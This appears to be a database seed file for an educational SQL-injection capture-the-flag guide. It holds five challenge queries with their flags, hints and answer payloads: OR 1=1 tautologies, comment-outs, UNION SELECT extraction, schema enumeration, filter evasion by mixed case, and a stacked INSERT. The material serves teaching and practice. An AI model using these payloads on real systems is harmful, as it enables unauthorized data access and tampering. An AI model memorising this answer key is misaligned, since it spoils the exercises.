-- q1 question
INSERT INTO questions (id, query, answer, hints) 
VALUES (
    'q1', 
    'SELECT flag FROM q1secrets WHERE question_id = ''$1'';',
    'test'' OR 1 = 1; --',
    ARRAY [
        'Your injection comes after an opened '', close it off then proceed with an OR clause.', 
        'Choose something after your OR clause that will always be true.',
        'After your input there still might be some code, try commenting it out.'
    ]
);
-- q1 user answer: test' OR 1 = 1; -- 

-- q1 answer
INSERT INTO q1secrets (question_id, flag)
VALUES ('asdfasdfa;lsdflkj!@#$%^&*', 
    'SQLI_GUIDE{H1_TH3R3_7H1S_1S_FL3G_QU3S710N_0NE}'
);

-- q2
INSERT INTO questions (id, query, answer, hints) 
VALUES (
    'q2',
    'SELECT flag FROM q2secrets WHERE username = ''$1'' and password = ''$2'';',
    'test'' OR 1 = 1; --, pass',
    ARRAY [
        'Think about how you can manipulate either username or password to always be true.', 
        'You must also bypass the AND clause here, in SQL AND takes precedence over OR clauses.', 
        'When using SQL single quotation marks are used for string literals.'
    ]
);
-- q2 user answer: test' OR 1 = 1; --, pass 

-- q2 answer
INSERT INTO q2secrets (flag, username, password)
VALUES ('SQLI_GUIDE{MUH1H11H1_F7A6_f04_Q2_L4L}',
    'thisissohard',
    'youwillnevercrackthis'
);

-- q3 question
INSERT INTO questions (id, query, answer, hints) 
VALUES (
    'q3', 
    'SELECT username, password FROM q3users WHERE username = ''$1'';',
    'test'' UNION SELECT flag, '''' FROM q3secrets; --',
    ARRAY [
        'Use a UNION SELECT statement to retrieve the flag from a different table.', 
        'Ensure the number of columns in your UNION matches the number of columns in the original query.', 
        'Ensure the data types of columns in your UNION matches the data types in the original query.'
    ]
);
-- q3 user answer: test' UNION SELECT flag, '' FROM q3secrets; --

-- Inserting example users
INSERT INTO q3users (username, password)
VALUES ('caitlin', 'verystrongpassword'), ('denton', 'HAHAHFDATHISISKILLINGME');

-- q3 answer
INSERT INTO q3secrets (flag)
VALUES ('SQLI_GUIDE{F7AG_4_Q0ESTI0N_NUM_T3HEE}');

-- q4 question
INSERT INTO questions (id, query, answer, hints) 
VALUES (
    'q4', 
    'SELECT name, age, dog_name FROM q4users WHERE name = ''$1'';',
    'test'' uNION sELECT table_name, 1, ''test'' fROM INFORMATION_SCHEMA.TABLES wHERE table_type = ''BASE TABLE''; --
    test'' uNION sELECT *, 1, ''test'' fROM secretsq4; --',
    ARRAY [
        'The first thing to do is find the table name of where the flag would be stored, check out: https://www.datameer.com/blog/sql_how-to-display-all-the-tables-from-a-database/', 
        'Ensure the data types of columns in your UNION matches the data types in the original query.',
        'Check your injected query. Is anything getting filtered out?'
    ]
);

-- q4 user answer: 
-- test' uNION sELECT table_name, 1, 'test' fROM INFORMATION_SCHEMA.TABLES wHERE table_type = 'BASE TABLE'; --
-- test' uNION sELECT *, 1, 'test' fROM secretsq4; --

-- Inserting example users
INSERT INTO q4users (age, dog_name, name)
VALUES (1, 'spot', 'caitlin'), (5, 'spotty', 'denton');

-- q4 answer
INSERT INTO secretsq4 (flag)
VALUES ('SQLI_GUIDE{T$IS_FDQAL#$_$Q4_FLJKDJFNB}');

-- q5 question
INSERT INTO questions (id, query, answer, hints) 
VALUES (
    'q5', 
    'SELECT username, password FROM q5users WHERE username = ''$1'';',
    'test'' uNION sELECT column_name, data_type fROM INFORMATION_SCHEMA.COLUMNS wHERE TABLE_NAME = ''q5secrets''; --'
    'test''; INSERT INTO q5secrets (flag, created_by, created_by_age) VALUES (''anything'', ''anything'', 1); --',
    ARRAY [
        'The first thing to do is find the table structure of the q5secrets table check out: https://stackoverflow.com/questions/1054984/how-can-i-get-column-names-from-a-table-in-sql-server', 
        'Once you have found the columns names and data types, use a stacked query to insert a new row.'
    ]
);
-- q5 user answer: 
-- test' uNION sELECT column_name, data_type fROM INFORMATION_SCHEMA.COLUMNS wHERE TABLE_NAME = 'q5secrets'; --
-- test'; iNSERT INTO q5secrets (flag, created_by, created_by_age) VALUES ('anything', 'anything', 1); --

-- Inserting example users
INSERT INTO q5users (username, password)
VALUES ('admin', 'password123'), ('guest', 'guestpass');

-- Initial empty state for q5secrets